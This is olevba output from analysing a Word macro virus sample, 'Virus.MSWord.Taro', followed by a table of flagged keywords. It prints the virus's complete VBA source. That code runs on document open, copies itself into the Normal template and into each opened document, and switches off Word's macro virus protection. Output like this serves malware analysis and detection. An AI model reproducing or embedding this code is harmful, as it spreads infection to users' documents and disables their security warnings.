olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Taro
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Taro - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO taro.bas 
in file: ./Virus.MSWord.Taro - OLE stream: 'Macros/VBA/taro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.taro.AutoOpen"
     For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        nor = nor + (NormalTemplate.VBProject.VBComponents(i).Name = "taro") * -1
        If nor = 1 Then n = i Else n = n
    Next
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        act = act + (ActiveDocument.VBProject.VBComponents(i).Name = "taro") * -1
        If act = 1 Then a = i Else a = a
    Next
     If nor = 0 Then
        ActiveDocument.VBProject.VBComponents(a).Export (NormalTemplate.Path & "\" & "taro.bas")
        NormalTemplate.VBProject.VBComponents.Import (NormalTemplate.Path & "\" & "taro.bas")
        Options.VirusProtection = False
        NormalTemplate.Save
    End If
    If act = 0 Then
        NormalTemplate.VBProject.VBComponents(n).Export (NormalTemplate.Path & "\" & "taro.bas")
        ActiveDocument.VBProject.VBComponents.Import (NormalTemplate.Path & "\" & "taro.bas")
        Options.VirusProtection = False
        ActiveDocument.Save
    End If
   
    ActiveDocument.Saved = True
    NormalTemplate.Saved = True
End Sub

Function U_Name(NewName As String)
    If NewName = "" Then
        U_Name = ActiveDocument.BuiltInDocumentProperties(3)
    Else
        ActiveDocument.BuiltInDocumentProperties(3) = NewName
    End If
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

